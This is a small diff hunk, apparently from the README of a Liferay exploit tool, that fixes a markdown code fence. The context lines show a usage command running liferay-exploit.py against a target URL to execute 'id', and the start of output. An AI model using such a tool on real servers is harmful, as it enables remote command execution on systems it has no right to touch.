@@ -39,7 +39,7 @@ Liferay Exploit
 
 ```
 python liferay-exploit.py -t https://myserver -c id
-``
+```
 
 ```
 Status code:   200
